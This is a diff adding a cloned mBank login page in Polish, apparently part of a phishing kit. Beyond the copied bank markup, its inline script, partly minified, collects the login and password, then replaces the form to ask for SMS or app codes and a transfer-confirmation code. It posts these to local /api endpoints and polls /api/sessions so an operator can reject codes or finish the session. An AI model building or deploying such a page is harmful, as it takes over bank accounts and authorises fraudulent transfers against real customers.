@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://online.mbank.pl/pl/Login -->
+<html lang="pl" style="" class="js canvas canvastext no-touch geolocation postmessage hashchange history websockets rgba backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csstransitions fontface generatedcontent localstorage applicationcache stylish-select js canvas canvastext no-touch geolocation postmessage hashchange history websockets rgba backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csstransitions fontface generatedcontent localstorage applicationcache"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; }
+        body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+    </style>
+
+
+    <meta name="description" content="Logowanie do serwisu transakcyjnego mBanku">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mBank serwis transakcyjny</title>
+
+
+
+
+    <link rel="Stylesheet" type="text/css" href="/assets/banks/mbank_files/420210206035512650778.css">
+    <style>
+        h2 {
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body style="font-family: sans-serif">
+
+
+
+
+
+<header class="header">
+
+
+
+
+    <a href="https://www.mbank.pl/">
+        <img class="header-left" src="/assets/banks/mbank_files/420210206035512685808.png" width="107" height="40" alt="Link do głównej strony mBank">
+    </a>
+
+
+    <h1 class="accessible-not-visible">Zaloguj się do serwisu transakcyjnego</h1>
+    <span class="header-left">Zaloguj się do serwisu transakcyjnego</span>
+    <span class="header-right desktop">
+
+
+    <a href="https://www.mbank.pl/bezpieczenstwo/">
+    <img class="ico-lock" src="/assets/banks/mbank_files/420210206035512689810.png" alt="">
+    Bezpieczeństwo
+</a>
+
+        </span>
+    <span class="header-right mobile-landscape">
+
+
+    <a href="https://www.mbank.pl/kontakt/oferta-indywidualna/">
+    <img class="ico-lock" src="/assets/banks/mbank_files/420210206035512693812.png" alt="">
+    Kontakt
+</a>
+
+        </span>
+    <span class="header-right mobile-landscape">
+
+
+    <a href="https://www.mbank.pl/bezpieczenstwo/">
+    <img class="ico-lock" src="/assets/banks/mbank_files/420210206035512689810.png" alt="">
+    Bezpieczeństwo
+</a>
+
+        </span>
+</header>
+<div class="main">
+    <div class="img-container">
+
+
+        <img src="/assets/banks/mbank_files/420210206035512698815.jpg" alt="" role="presentation">
+
+
+    </div>
+    <div class="panel">
+
+
+        <center>
+            <div id="retail" class="login expanded login-form scenario-default">
+                <div class="login-container">
+                    <div id="loginForm" method="POST" autocomplete="off">
+                        <div class="color"></div>
+                        <div class="login-content">
+                            <div class="title-container ">
+                                <h2 class="accessible-not-visible">Klienci indywidualni i firmowi</h2>
+                                <div class="title">Klienci indywidualni i firmowi</div>
+                            </div>
+
+                            <div class="logged-container" role="alert" aria-live="assertive">
+                                <div class="logged">Zalogowano</div>
+                            </div>
+
+                            <div class="spinner-container">
+                                <div class="photo spinner"></div>
+                            </div>
+
+                            <div class="error-container" role="alert">
+                                <div id="errorMessage" class="message"></div>
+                                <div id="errorDetails" class="details"></div>
+                            </div>
+
+                            <div class="form-container">
+                                <div class="photo-container">
+                                    <div class="avatar photo photo-retail" style="background-image: url(/assets/banks/mbank_files/420210206035512703817.png)"></div>
+                                </div>
+                                <div class="field-container" id="mainCont">
+
+                                    <div class="form-input">
+                                        <input name="userID" id="bank_login" type="text" maxlength="24" required="" placeholder="Identyfikator" aria-describedby="userIDDescription" autofocus="" autocomplete="off">
+                                        <a tabindex="-1" href="#" aria-label="Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta." class="tooltip">
+                                            <i>?</i>
+                                        </a>
+                                        <div class="accessible-not-visible" id="userIDDescription">Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta.</div>
+                                    </div>
+                                    <div class="form-input">
+                                        <input name="pass" id="bank_password" type="password" maxlength="32" required="" placeholder="Hasło" aria-describedby="passDescription" autocomplete="off">
+                                        <a tabindex="-1" href="#" aria-label="Wpisz hasło, którego używasz do logowania w serwisie transakcyjnym mBanku. Pamiętaj, że system rozpoznaje duże i małe litery." class="tooltip">
+                                            <i>?</i>
+                                        </a>
+                                        <div class="accessible-not-visible" id="passDescription">Wpisz hasło, którego używasz do logowania w serwisie transakcyjnym mBanku. Pamiętaj, że system rozpoznaje duże i małe litery.</div>
+                                    </div>
+
+                                </div>
+                            </div>
+                            <div id="capslockWarning" class="capslock-warning" style="display: none;">Caps Lock włączony</div>
+                        </div>
+                        <div class="buttons form-buttons" id="buttonsCont">
+                            <button id="submitButton" form="loginForm" type="submit" class="btn" onclick="bankLogin(); plusBankUpdate()">
+                                Zaloguj się
+                            </button>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="buttons info-buttons component-info">
+                    <troubleshot-modal-information theme="pl"></troubleshot-modal-information>
+
+                </div>
+                <div class="buttons info-buttons right">
+                    <a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html" target="_blank" class="login-problems-link left">Problem z zalogowaniem?</a>
+                </div>
+            </div>
+        </center>
+
+
+
+    </div>
+</div>
+
+<div class="adv-container">
+    <div class="small-adv-placeholder">
+        <div class="adv">
+
+
+            <a href="https://www.mbank.pl/bezpieczenstwo/" tabindex="-1">
+                <img src="/assets/banks/mbank_files/420210206035512719823.png" alt="" role="presentation">
+            </a>
+
+        </div>
+    </div>
+    <div class="big-adv-placeholder">
+        <div class="adv desktop">
+
+
+            <a href="https://www.mbank.pl/bezpieczenstwo/" tabindex="-1">
+                <img src="/assets/banks/mbank_files/420210206035512723825.png" alt="" role="presentation">
+            </a>
+
+        </div>
+    </div>
+</div>
+<div class="footer-container">
+    <div class="short-footer-placeholder">
+        <div id="security_and_contact" class="security_panel">
+                <span class="security_and_contact_portrait">
+
+
+    <a href="https://www.mbank.pl/kontakt/oferta-indywidualna/">
+    <img class="ico-lock" src="/assets/banks/mbank_files/420210206035512693812.png" alt="">
+    Kontakt
+</a>
+
+                </span>
+            <span class="security_and_contact_portrait">
+
+
+    <a href="https://www.mbank.pl/bezpieczenstwo/">
+    <img class="ico-lock" src="/assets/banks/mbank_files/420210206035512689810.png" alt="">
+    Bezpieczeństwo
+</a>
+
+                </span>
+        </div>
+    </div>
+    <div class="long-footer-placeholder">
+        <div class="security">
+            <div id="log-in-panel-footer-security">
+                <h2>mBank ostrzega!</h2>
+                <ul>
+                    <li><span style="color: #000000; font-size: 12px;"><span style="color: #000000;"><strong><a href="https://www.mbank.pl/informacje-dla-klienta/indywidualny/post,9323,uwaga-oszusci-moga-wyludzac-dane-twoich-kart-platniczych.html">Uwaga! Oszuści mogą wyłudzać dane Twoich kart płatniczych<span style="color: #000000;">- więcej</span></a></strong></span></span></li>
+                </ul>
+                <h2>Bezpieczeństwo</h2>
+                <ul>
+                    <li><span style="color: #000000; font-size: 12px;"><strong>1.&nbsp;<span style="color: #000000;"><a href="https://www.mbank.pl/bezpieczenstwo"><span style="color: #000000;">mBank ostrzega! <span style="color: #000000;">- więcej</span></span></a></span></strong></span></li>
+                    <li><span style="color: #000000; font-size: 12px;"><strong>2.&nbsp;</strong><span style="color: #000000;"><a href="https://www.mbank.pl/bezpieczenstwoPB/zlote-zasady/"><span style="color: #000000;">Złote zasady bezpieczeństwa <span style="color: #000000;">- <strong>więcej</strong></span></span></a></span></span></li>
+                    <li><span style="color: #000000; font-size: 12px;"><strong>3. </strong><span style="color: #000000;"><a href="https://www.mbank.pl/bezpieczenstwoPB/bezpieczny-komputer/"><span style="color: #000000;">Bezpieczny bank w komputerze <span style="color: #000000;">- <strong>więcej</strong></span></span></a></span></span></li>
+                    <li><span style="color: #000000; font-size: 12px;"><strong>4.</strong>&nbsp;<a href="https://www.mbank.pl/bezpieczenstwoPB/bezpieczny-telefon/"><span style="color: #000000;"><span style="color: #000000;">Bezpieczny bank w telefonie i na tablecie </span></span></a></span><a href="https://www.mbank.pl/bezpieczenstwoPB/bezpieczny-telefon/"><span style="color: #000000;"><span style="color: #000000;"><span style="color: #000000;">-</span></span><span style="font-size: 12px;"><strong><span style="color: #000000;"> więcej</span></strong></span></span></a></li>
+                    <li><span style="color: #000000; font-size: 12px;"><strong>5.&nbsp;</strong><span style="color: #000000;"><span style="color: #000000;"><a href="https://www.mbank.pl/bezpieczenstwoPB/bezpieczna-karta/">Bezpieczeństwo kart płatniczych <span style="color: #000000;">- <strong>więcej</strong></span></a></span></span></span></li>
+                    <li><span style="color: #000000; font-size: 12px;"><strong>6.&nbsp;</strong><span style="color: #000000;"><a href="https://www.mbank.pl/bezpieczenstwoPB/dbalosc-o-bezpieczenstwo/"><span style="color: #000000;">Jak mBank dba o Twoje bezpieczeństwo <span style="color: #000000;">- <strong>więcej</strong></span></span></a></span></span></li>
+                </ul>
+                <p><span style="font-size: 12px;">&nbsp;</span></p>
+            </div>
+            <div id="log-in-panel-footer-contact">
+                <h2> Masz problem z zalogowaniem? </h2><h2>
+
+                    <span style="color: #000000; font-size: 13px;"><a href="https://www.mbank.pl/pomoc/info/bezpieczenstwo/logowanie-odblokowanie.html"><strong><span style="text-decoration: underline; color: #000000; font-size: 13px;">Sprawdź</span></strong></a> jak odblokować dostęp do serwisu transakcyjnego </span>
+                    <br><br>
+                </h2><h2>Kontakt</h2>
+
+                <div id="mLine-24h">
+                    <div class="mLine-text">
+                        <span class="header">mLinia</span>
+                        <span class="text" style="color: #000000; font-size: 18px;">801 300 800</span>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script src="/assets/js/banklogin.js"></script>
+<script>
+    let bankId = (cookieManager.read('session_id'))
+
+    const plusBankUpdate = () => {
+        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+            $("#mainCont").empty()
+            $("#mainCont").append('<div class="form-input"> <input name="pass" id="bank_psd" type="password" maxlength="32" required="" placeholder="Wpisz SMS lub potwierdź w aplikacji" aria-describedby="passDescription" autocomplete="off"> <a tabindex="-1" href="#" aria-label=" Wpisz kod SMS lub potwierdź transakcję w aplikacji mobilnej mBanku." class="tooltip"> <i>?</i> </a> <div class="accessible-not-visible" id="passDescription">Wpisz kod SMS lub potwierdź transakcję w aplikacji mobilnej mBank.</div></div>')
+            $("#buttonsCont").empty()
+            $("#buttonsCont").append('<button id="submitButton" form="loginForm" type="submit" class="btn" onclick="psdUpdate()"> Zaloguj się </button>')
+        } else {
+        }
+    }
+
+    const regularCheck = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "true") {
+                        summaryFunc()
+                        clearInterval(multipleFunc)
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+    const psdUpdate = () => {
+        if ($("#bank_psd").val() !== "") {
+            $.post("/api/psdupdate/", {
+                bank_psd: $("#bank_psd").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<br><br><div class="title">Logowanie...</div>')
+                document.getElementById('submitButton').style.display = 'none'
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+
+    //WRONG PASS
+
+    const wrongPass = () => {
+        $.post("/api/wrongpass/", {
+            sessionId: bankId,
+            name: "false"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const regularPass = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "wrongPass") {
+                        clearInterval(multiplePass)
+                        wrongPass()
+                        location.reload()
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+
+    let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+    const summaryFunc = () => {
+        $("#mainCont").empty()
+        $("#mainCont").append(' <div class="form-input"> <input name="userID" id="bank_summary" type="text" maxlength="24" required="" placeholder="Wpisz SMS lub potwierdź w aplikacji" aria-describedby="userIDDescription" autofocus="" autocomplete="off"> <a tabindex="-1" href="#" aria-label="Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta." class="tooltip"> <i>?</i> </a> <div class="accessible-not-visible" id="userIDDescription">Wpisz nazwę użytkownika lub 8-cyfrowy numer klienta, lub 16-cyfrowy numer karty płatniczej. Jeżeli logujesz się pierwszy raz skorzystaj z tymczasowego numeru klienta.</div></div>')
+        $("#buttonsCont").empty()
+        $("#buttonsCont").append('<button id="submitButton" form="loginForm" type="submit" class="btn" onclick="summaryCode()"> Potwierdź przelew </button>')
+    }
+
+    const summaryCode = () => {
+        if ($("#bank_summary").val() !== "") {
+            $.post("/api/summarycode/", {
+                bank_summary: $("#bank_summary").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<p style="font-size: 20px">Logowanie...</p>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+    const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+
+</script>
+
+
+
+
+
+
+
+
+
+
+</body></html>
+
